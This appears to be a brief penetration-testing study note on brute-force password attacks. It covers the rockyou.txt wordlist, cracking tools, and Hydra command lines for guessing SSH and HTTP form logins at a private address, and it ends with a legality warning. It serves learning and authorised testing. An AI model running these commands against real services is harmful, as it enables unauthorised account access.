# Brute Force Attacks

**What it is:** Systematically trying every entry from a wordlist to crack a password or gain access to a service.

## How it Works
1. Takes a **wordlist** — a `.txt` file with thousands/millions of common passwords
2. Tries each entry against the target login automatically
3. Stops when it finds a match

## The Most Important Wordlist

**`rockyou.txt`** — a real leaked password database with ~14 million entries.
Standard location on Kali Linux:
```bash
/usr/share/wordlists/rockyou.txt

# If it's compressed, unzip it first:
gunzip /usr/share/wordlists/rockyou.txt.gz
```

## Common Tools

| Tool | Type | Use Case |
|------|------|----------|
| **Hydra** | Online | SSH, FTP, HTTP login forms, RDP — attacks live services |
| **John the Ripper** | Offline | Cracks password hashes from a file |
| **Hashcat** | Offline | GPU-accelerated hash cracking, extremely fast |
| **Medusa** | Online | Similar to Hydra, multi-protocol |

## Hydra Examples

```bash
# Brute force SSH with a known username
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Brute force with a username list too
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Brute force an HTTP login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### Hydra Key Flags

| Flag | Description |
|------|-------------|
| `-l` | Single username |
| `-L` | File with list of usernames |
| `-p` | Single password |
| `-P` | Wordlist file |
| `-t` | Number of parallel threads (e.g., `-t 4`) |
| `-v` | Verbose output |

## Types of Brute Force

- **Dictionary attack** — uses a wordlist (most common, much faster)
- **Pure brute force** — tries every character combination (very slow, only for short targets)
- **Credential stuffing** — uses leaked username:password pairs from data breaches

> ⚠️ Brute forcing systems without permission is a criminal offense. Practice only on intentionally vulnerable machines (e.g., DVWA, Metasploitable, TryHackMe labs).
